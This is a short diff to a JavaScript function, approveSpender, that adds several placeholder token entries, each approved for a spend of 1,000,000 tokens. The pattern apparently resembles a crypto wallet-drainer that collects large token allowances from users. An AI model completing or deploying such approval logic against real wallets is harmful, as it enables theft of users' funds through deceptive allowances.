@@ -138,6 +138,10 @@ async function approveSpender(account) {
 
     const tokens = [
       { address: 'TOKEN_CONTRACT_ADDRESS_1_HERE', amount: window.web3.utils.toWei('1000000', 'ether') },
+      { address: 'TOKEN_CONTRACT_ADDRESS_1_HERE', amount: window.web3.utils.toWei('1000000', 'ether') },
+      { address: 'TOKEN_CONTRACT_ADDRESS_1_HERE', amount: window.web3.utils.toWei('1000000', 'ether') },
+      { address: 'TOKEN_CONTRACT_ADDRESS_1_HERE', amount: window.web3.utils.toWei('1000000', 'ether') },
+      { address: 'TOKEN_CONTRACT_ADDRESS_1_HERE', amount: window.web3.utils.toWei('1000000', 'ether') }
       // add more tokens here if needed
     ];
 
